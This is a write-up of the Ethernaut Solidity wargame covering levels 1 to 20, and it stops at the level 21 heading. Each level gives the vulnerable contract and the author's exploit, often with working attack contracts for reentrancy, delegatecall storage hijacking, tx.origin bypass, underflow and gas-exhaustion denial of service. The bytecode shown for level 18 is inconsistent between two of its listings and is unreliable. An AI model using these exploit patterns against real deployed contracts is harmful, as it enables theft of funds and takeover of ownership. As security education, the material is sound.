# Ethernaut CTF Writeup

The Ethernaut is a **Web3/Solidity based wargame** inspired by <a target="_blank" rel="noopener noreferrer" href="https://overthewire.org/wargames/">overthewire</a>, played in the _Ethereum Virtual Machine_. Each level is a smart contract that needs to be 'hacked'. It is maintained by <a target="_blank" rel="noopener noreferrer" href="https://www.openzeppelin.com/">openzeppelin</a>.

It consists of 29 different levels covering different security vulnerabilities of Solidity smart contracts. It took me a little over a month to complete them. It's a great introduction to web3 security.

![blockchain astronaut](/blockchain_astronaut.png "blockchain astronaut")

## Levels - Table of content

-   [Level 01 - Fallback](#01)
-   [Level 02 - Fallout](#02)
-   [Level 03 - CoinFlip](#03)
-   [Level 04 - Telephone](#04)
-   [Level 05 - Token](#05)
-   [Level 06 - Delegation](#06)
-   [Level 07 - Force](#07)
-   [Level 08 - Vault](#08)
-   [Level 09 - King](#09)
-   [Level 10 - Re-entrancy](#10)
-   [Level 11 - Elevator](#11)
-   [Level 12 - Privacy](#12)
-   [Level 13 - Gatekeeper One](#13)
-   [Level 14 - Gatekeeper Two](#14)
-   [Level 15 - NaughtCoin](#15)
-   [Level 16 - Preservation](#16)
-   [Level 17 - Recovery](#17)
-   [Level 18 - Magic Number](#18)
-   [Level 19 - AlienCodex](#19)
-   [Level 20 - Denial](#20)
-   [Level 21 - Shop](#21)
-   [Level 22 - Dex](#22)
-   [Level 23 - Dex2](#23)
-   [Level 24 - PuzzleWallet](#24)
-   [Level 25 - Motorbike](#25)
-   [Level 26 - DoubleEntryPoint](#26)
-   [Level 27 - Good Samaritan](#27)
-   [Level 28 - GatekeeperThree](#28)
-   [Level 29 - Switch](#29)
-   [Essential readings](#readings)

## <a id="01"></a>Level 01 - Fallback

### Objectives

1. Claim ownership of the contract.
2. Reduce it's balance to 0.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;

  contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 \* (1 ether);
  }

  modifier onlyOwner {
    require(
      msg.sender == owner,
        "caller is not the owner"
      );
    _;
  }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
    }
  }

```

</details>

### Exploit

Access control is handled by an `onlyOwner` function modifier. The `withdraw` function which transfers all funds to the caller can only be called by the owner.

The `receive` function assigns the owner to `msg.sender` if the require condition is met. Therefore all we need is for `msg.value > 0 && contributions[msg.sender] > 0` to be true.

I first called `contribute` with 1 wei. This makes my `contributions` greater than 0. Then I sent the contract another 1 wei. This triggered the `receive` function and successfully met the `require` condition. **I am now the owner!**

All that is left is to empty the balance of the contract. I called `withdraw` which transferred the funds to my account. **The level is now complete!**

## <a id="02"></a>Level 02 - Fallout

### Objective

1. Claim ownership of the contract.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {

  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
      require(
        msg.sender == owner,
        "caller is not the owner"
      );
      _;
    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

</details>

### Exploit

In older versions of Solidity, the `constructor` function was created by writing a `public function` with the same name as the contract itself. In this case, it will be called `Fallout`.

However, whoever wrote this contract made a **dangerous typo**. The function is named `Fal1out` not `Fallout`. Instead of being the `constructor`, this creates a `public` function that can be called by anyone. This is bad since constructors typically handles critical functionality.

To solve the level, all I needed to do is call `Fal1out` to become the owner.

## <a id="03"></a>Level 03 - CoinFlip

### Objective

1. Win the game by guessing the correct outcome 10 times in a row.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool \_guess) public returns (bool) {
  uint256 blockValue = uint256(blockhash(block.number - 1));

  if (lastHash == blockValue) {
    revert();
  }

  lastHash = blockValue;
  uint256 coinFlip = blockValue / FACTOR;
  bool side = coinFlip == 1 ? true : false;

  if (side == \_guess) {
    consecutiveWins++;
    return true;
  } else {
    consecutiveWins = 0;
    return false;
  }

  }
}

```

</details>

### Exploit

The `Coinflip` contract uses `block.number` as a source of randomness. That's bad since everyone has access to `block.number`.

I wrote a `Hack` contract that reads `block.number`, determines the outcome of the flip and then calls `flip` with the correct outcome.

```js
contract Hack {
  CoinFlip target;

  constructor (address _target) {
    target = CoinFlip(_target);
  }

  function hack() external {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    target.flip(side);
  }
}
```

I deployed this contract with the `CoinFlip` address as `_target`. I then called `hack` 10 times in a row and won the game.

## <a id="04"></a>Level 04 - Telephone

### Objective

1. Claim ownership of the contract.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
address public owner;

    constructor() {
      owner = msg.sender;
    }

    function changeOwner(address _owner) public {
      if (tx.origin != msg.sender) {
        owner = _owner;
      }
    }
}
```

</details>

### Exploit

The only way to change the owner is with `changeOwner` which requires `tx.origin != msg.sender` to be true.

By interacting with `Telephone` through a deployed contract, the require condition will be met.

I deployed the following `Hack` contract with `Telephone`'s address for `_targetAddress`.

```js
contract Hack {
  Telephone target;

  constructor(address _targetAddress) {
    target = Telephone(_targetAddress);
  }

  function hack() external {
    target.changeOwner(msg.sender);
  }
}
```

I called the `hack` function and became the owner.

## <a id="05"></a>Level 05 - Token

### Objective

1. Get your hands on more than the 20 tokens you start with. Preferably a very large amount of tokens.

#### Things that might help:

-   What is an odometer?

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

</details>

### Exploit

Let's exploit the fact that the Solidity version used is 0.6.X. In that version, _arithmetic overflows and underflows_ **were not caught by the compiler**.

We start with 20 tokens. A require condition of `balances[msg.sender] - _value >= 0` checks we have enough tokens before transfering them.

To _"hack"_ this contract, I called `transfer` with 21 tokens to a random address. This causes an _arithmetic underflows_ which satisfies the require condition and sets my balance to the biggest possible value of a `uint256`. My new balance is now 115792089237316195423570985008687907853269984665640564039457584007913129639935.

## <a id="06"></a>Level 06 - Delegation

### Objective

1. claim ownership of the instance.

#### Things that might help

-   Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
-   Fallback methods
-   Method ids

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

</details>

### Exploit

The goal is to become `owner` of the `Delegation` contract. `Delegation` does not have a direct way to change the `owner`. That being said, its `fallback` function makes a `delegatecall` to the `Delegate`.

I used this to my advantage by calling the `pwn` function in the `Delagation` contract. Since there is no such function, it triggers the `fallback` function which does a `delegatecall` to the `Delegate` contract.

By calling `pwn` we use the logic of `Delegate` on the state of `Delegation`. This changed the owner to the `msg.sender`!

## <a id="07"></a>Level 07 - Force

### Objective

1. Make the balance of the contract greater than zero.

#### Things that might help:

-   Fallback methods
-   Sometimes the best way to attack a contract is with another contract.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

</details>

### Exploit

We can't send Ether directly to the `Force` contract since it does not have a `receive` function.

That being said, `selfdestruct` can send Ether to any contract whatsoever.

```js
contract ForceHack {
  Force target;

  constructor(address payable _targetAddress) {
    target = Force(_targetAddress);
  }

  function hack() external {
    selfdestruct(payable (address (target)));
  }

  receive() external payable {}
}
```

I deployed my `Hack` contract and then sent it some ether. Calling the `hack` function executes the `selfdestruct` which transfers the balance to the `Force` contract. This completes the level.

## <a id="08"></a>Level 08 - Vault

### Objective

1. Unlock the vault.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

</details>

### Exploit

The `password` variable is stored in index 1 of the contract's storage. This is stored on chain and **can be read by anyone**.

I entered the following function call in the browser console to read the value of `password`.

```js
await web3.eth.getStorageAt(contract.address, 1);
```

I then called `unlock` with the password to unlock the vault.

## <a id="09"></a>Level 09 - King

### Objective

1. Break the game.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

</details>

### Exploit

Let's deploy a hack contract with an amount of ether equal or greater than the current prize amount which is 10e15 wei.

```js
contract KingHack {
  King target;

  constructor(address payable _targetAddress) payable {
    target = King(_targetAddress);
  }

  function hack() external {
    (bool success,) = payable(address(target)).call{value: target.prize()}("");
    require(success, "Did not work!");
  }

  receive() external payable {
    revert();
  }
}
```

By calling the `hack` function, our contract transfers an amount of eth equal to the current prize. This satisfies the require condition `msg.value >= prize || msg.sender == owner`. The hack contract is now the king. That being said, the `receive` function reverts when executed.

This breaks the game as it transfers the prize back to the contract.

## <a id="10"></a>Level 10 - Re-entrancy

### Objective

1. Steal all the funds from the contract.

#### Things that might help:

-   Untrusted contracts can execute code where you least expect it.
-   Fallback methods
-   Throw/revert bubbling
-   Sometimes the best way to attack a contract is with another contract.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

</details>

### Exploit

This level is a textbook reentrancy attack. I write and deployed the following `Hack` contract.

```js
contract Hack {
    Reentrance target;

    constructor(address payable _targetAddress) public payable {
        target = Reentrance(_targetAddress);
    }

    function hack() external payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        if(address(target).balance > 0){
            target.withdraw(msg.value);
        }
    }
}
```

Let's take note that the level contract has a balance of 0.001 eth.

I called the `hack` function with a value of 0.001 eth. This will calls `donate` with 0.001 eth and calls `withdraw` once for the same amount. The `receive` function is now trigerred, it withdraws a second time **in the same transaction**. The `Reentrance` contract is not empty.

## <a id="11"></a>Level 11 - Elevator

### Objective

1. Reach the top of your building.

Things that might help:

-   Sometimes solidity is not good at keeping promises.
-   This Elevator expects to be used from a Building.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

</details>

### Exploit

It's a little unclear but the goal of the level is to change the `top` variable to true.

To accomplish this I exploited the fact that `Elevator` uses an interface. As long as I follow the function signature, I can create the function I want.

I deployed the following `Hack` contract.

```js

contract Hack {
    Elevator target;
    bool isFirstCall;

    constructor(address _targetAddress) {
        target = Elevator(_targetAddress);
        isFirstCall = true;
    }

    function isLastFloor(uint _level) external returns(bool){
        if(isFirstCall){
            isFirstCall = false;
            return false;
        }
        return true;
    }

    function hack(uint _level) external {
        target.goTo(_level);
    }
}

```

All that is left is to call the `hack` function with a uint argument. My custom `isLastFloor` function alwars return false the first time it is called and true all subsequent calls. This tricks the `Elevator` logic and sets `top` to true.

## <a id="12"></a>Level 12 - Privacy

### Objective

1. Unlock this contract to beat the level.

Things that might help:

-   Understanding how storage works
-   Understanding how parameter parsing works
-   Understanding how casting works

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

</details>

### Exploit

The first step is to do some storage slot archeology. Here are the first 8 storage slots values:

0: 0x0000000000000000000000000000000000000000000000000000000000000001  
1: 0x0000000000000000000000000000000000000000000000000000000065692458  
2: 0x000000000000000000000000000000000000000000000000000000002458ff0a  
3: 0x08115e1fb5101284776275ec599e3550f24a67be28bcff70ba506a37d67c9466  
4: 0x3244f17d9a861fac893f45d75ce1e04ef41320f5674d35831da902dbf2f52d49  
5: 0x98e0ab86d5e785f034c084f16ffe2d95c4f2c526043bedd12aca2a0a9ef852bd  
6: 0x0000000000000000000000000000000000000000000000000000000000000000  
7: 0x0000000000000000000000000000000000000000000000000000000000000000

The key is the value of `data[2]` which is located in index 4.

Next we need to evaluate the type coersion of `bytes16(0x98e0ab86d5e785f034c084f16ffe2d95c4f2c526043bedd12aca2a0a9ef852bd)` which results in `0x98e0ab86d5e785f034c084f16ffe2d95`. These are the 16 most significants bytes of the bytes32.

All that is left is to call the `unlock` function with `0x98e0ab86d5e785f034c084f16ffe2d95` as argument and the contract will unlock.

## <a id="13"></a>Level 13 - GatekeeperOne

### Objective

1. Register as an entrant.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

</details>

### Solution

The three gates are three _function modifiers_ that each have `require` conditions.

To pass `gateOne` we need to deploy a contract and interact with `GatekeeperOne` through it. This is because `tx.origin` and `msg.sender` will not be the same.

To pass `gateTwo` we need to send a specific amount of gas when calling `enter()` so whatever is left is a multiple of 8191. I'm too lazy to figure it out. I simply **brute forced it** by trying all different amounts until it works.

Lastly, to successfully pass `gateThree`, we need to send a `bytes8` that correctly passes through 3 `require` conditions. We easily see that we need for ` uint16(uint160(tx.origin)) ==  uint16(uint64(_gateKey))`. `tx.origin` is my EOA, and so the left side of the comparison evaluates to `19071`. I found it's value in hex with the following command

```
web3.utils.encodePacked(19071)
```

This returns `0x0000000000000000000000000000000000000000000000000000000000004a7f` which is in bytes 32. In bytes8 we have `0x0000000000004a7f`.

We need to modify this last value to make the following true `uint32(uint64(_gateKey)) != uint64(_gateKey)`. This is quite simple. I replaced a 0 with any other value in the first 4 leftmost bytes. I chose `0x1000000000004a7f`. This is the correct value for `_gateKey` relative to my EOA.

Here is the hack contract I deployed to complete the challenge.

```js
contract Hack {
  GatekeeperOne target;

  constructor(address _targetAddress) {
    target = GatekeeperOne(_targetAddress);
  }

  // running the tx without gate two costs 49829 gas. Let's start there
  // 300000 is an arbitray number i selected
  function hack() external {
    for(uint256 i = 49829; i <= 49829 + 3000000; i++){
      (bool success, ) = address(target).call{gas: i}(abi.encodeWithSignature("enter(bytes8)", bytes8(0x1000000000004a7f)));
      if (success) {
        break;
      }
    }
  }
}
```

## <a id="14"></a>Level 14 - Gatekeeper Two

### Objective

1. Register as an entrant.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

</details>

### Solution

This level follows the same idea as the previous one.

To pass `gateOne` we need to deploy a contract and interact with `GatekeeperTwo` through it. This is because `tx.origin` and `msg.sender` will not be the same.

To pass `gateTwo` will need creativity. The assembly section uses two Opcodes. `caller` which in this case is `msg.sender`. `extcodesize` is the size of the code of a contract in bytes. So the `require` condition is that the contract that interact with `GatekeeperTwo` needs to have a size of zero. This is technically impossible **once the contract is deployed**. On the other hand, if the interaction happens inside the `constructor`, `extcodesize` will evaluate to 0.

Lastly, to pass `gateThree`, we need to provide a key that will respect this scary `require` condition. Since we know the value of both `msg.sender` and `type(uint64).max` we can do some bitwise algebra. In this case, a and c are known in `a ^ b == c`. Since bitwise XOR ir **reversible** we have that `a ^ c == b`;

Here is the contract I deployed to solve the level:

```js
contract Hack {
    constructor(address _targetAddress) {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  type(uint64).max);
        GatekeeperTwo(_targetAddress).enter(gateKey);
    }
}
```

## <a id="15"></a>Level 15 - NaughtCoin

### Objective

1. You're holding all the NaughtCoins. The goal is to transfer them to another address.

<details>
  <summary>Level Contract</summary>

```js

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player)
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }

  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
      _;
    }
  }
}

```

</details>

### Exploit

Using `transfer` is not possible due to the `lockTokens` modifier. Luckily there is another way to transfer erc20 tokens. `transferFrom` is not overridden in `NaughtCoin` which leaves it unprotected from `lockTokens`.

Using `transferFrom` requires the owner of the tokens to approve a spender for a certain amount. **Even when the spender is himself**.

I called `approve` with my EOA as both owner and spender for the total amount of NaughtCoins which is `1000000000000000000000000`. I followed by calling `tranferFrom` from your my EOA to a random address for the total amount of tokens. And voilà! The level is solved.

## <a id="16"></a>Level 16 - Preservation

### Objective

1. Claim ownership of the contract.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

</details>

### Exploit

Looking at `LibraryContract` we can see that the `setTime` function modifies the value of storage slot 0. Therefore calling `setFirstTime` or `setSecondTime` will change the value of `timeZone1Library`. Let's use this to our advantage.

I deployed the following `Hack` contract.

```js
contract Hack {
  address public placeHolder1;
  address public placeHolder2;
  address public owner;

  function setTime(uint256 _concealedAddress) public {
    owner = address(uint160(_concealedAddress));
  }
}
```

Calling `setFirstTime` with the `Hack` contract's address, left-padded with zeroes as parameter, changes the value of `timeZone1Library` to the `Hack` contract's address. Now we can call `setFirstTime` and it will `delegatecall` to the `Hack` contract instead.

Calling it a second time with your `player` address as parameter sets you as the new owner.

## <a id="17"></a>Level 17 - Recovery

### Objective(s)

1. Remove all the funds from the lost address.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);

  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public {
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

</details>

### Exploit

We know the address of the Recovery contract. By looking at the internal transaction on a block explorer we see the transaction which has a value of 0.001 ETH. The receipient is the lost contract.

With the lost address now found, we can call `destroy` with any address to win the level.

## <a id="18"></a>Level 18 - MagicNumber

### Objective

1. Provide the Ethernaut with a contract that responds to `whatIsTheMeaningOfLife()` with the right number. This contract needs to be 10 Opcodes long maximum.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {

  address public solver;

  constructor() {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____
     __________/\\\\\_____/\\\///////\\\___
      ________/\\\/\\\____\///______\//\\\__
       ______/\\\/\/\\\______________/\\\/___
        ____/\\\/__\/\\\___________/\\\//_____
         __/\\\\\\\\\\\\\\\\_____/\\\//________
          _\///////////\\\//____/\\\/___________
           ___________\/\\\_____/\\\\\\\\\\\\\\\_
            ___________\///_____\///////////////__
  */
}

```

</details>

### Exploit

As we can see with the Asci art, the number we need to return is 42.

.

With a quick Google search I found <a target="_blank" rel="noopener noreferrer" href="https://www.evm.codes/playground">this website</a> an interactive playground for EVM contracts and Opcodes. When changing the DDL value to Bytecode, the placeholder example does exactly what we want with one distiction. It returns 0x42 and not 42 the uint value. By substituting the value we get:

```
602A60005260206000F3
```

This is the _runtime bytecode_. This is the code that will stay on the blockchain after deployment. We now need the _initialization bytecode_.

Let's preprend out _runtime code_ with bytecode that "gets or reads" the runtime and then "returns" it. These two action corresponds to `CODECOPY` and `RETURN`. Let's tackle them one at a time.

`CODECOPY` needs three inputs.

1. The offset in bytes of where the result will be copied in memory. We can use 0x00 for this since we won't have anything else in memory.
2. The offset in bytes of where the value to be read starts. We don't know yet.
3. The length of the value to be read. In our case it's 10 bytes exactly.

`RETURN` needs two inputs.

1. The offset in bytes of where in the memory the return data is located. It's 0x00 in our case.
2. The size in bytes of the return data. It's 10 in our case.

Combining it all we get the following.

```
600a600c600039600a6000f3
```

The final opcode is the following.

```
600a600c600039600a6000f3602a60505260206050f3
```

I don't know how to deploy a contract directly from bytecode using Remix. The only way I found is with web3.js. Here is the command I used in the browser console.

```js
const bytecode = "0x600a600c600039600a6000f3602A60005260206000F3";
web3.eth.sendTransaction({ from: player, data: bytecode }, function (err, res) {
    console.log(res);
});
```

Calling `setSolver` with the deployed contract's address as argument solves the level.

## <a id="19"></a>Level 19 - AlienCodex

### Objective

1. Claim ownership of the contract.

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

</details>

### Exploit

I started by calling `makeContact`. This sets `contact` to `true`.

From there let's take note of the contract's storage layout.

0: 0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11
1: 0x0000000000000000000000000000000000000000000000000000000000000000

The first slot we see the owner's address and a boolean representing `contact`. Slot 1 represents the length of the dynamic array `codex`. It is currently 0 since it's empty.

I called `retract` which creates an _underflow_. Looking at slot 1 once more we can see a new value of `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`. This is 2\*\*256 - 1 in hex. This means that the array wraps around and covers **all possible storage slots**! That being said, it has not assigned values to each slots. It only changed the length of the array.

I took advantage of this by finding find the array index that corresponds to storage slot 0 of the contract and calling `revise` with my address left padded with zeroes.

I found the index with the following math.

```js
uint256 public a = uint256(keccak256(abi.encodePacked(uint256(1))));
uint256 public max = 2\*\*256 - 1;
uint256 public index = max - a + 1;
```

## <a id="20"></a>Level 20 - Denial

### Objective

1. Deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less).

<details>
  <summary>Level Contract</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

</details>

### Exploit

We can't _D.O.S._ with an unexepected `revert` since it uses `call`.

Instead I deployed the following `Hack` contract. I has an inifite loop that will consume all of the gas before reaching the `transfer` function.

```js
contract Hack {
    receive() external payable {
        while(true){
        }
    }
}
```

All that is needed is to set this contract's address as the withdraw partner with `setWithdrawPartner`.

## <a id="21"></a>Level 21 - Shop

### Objective

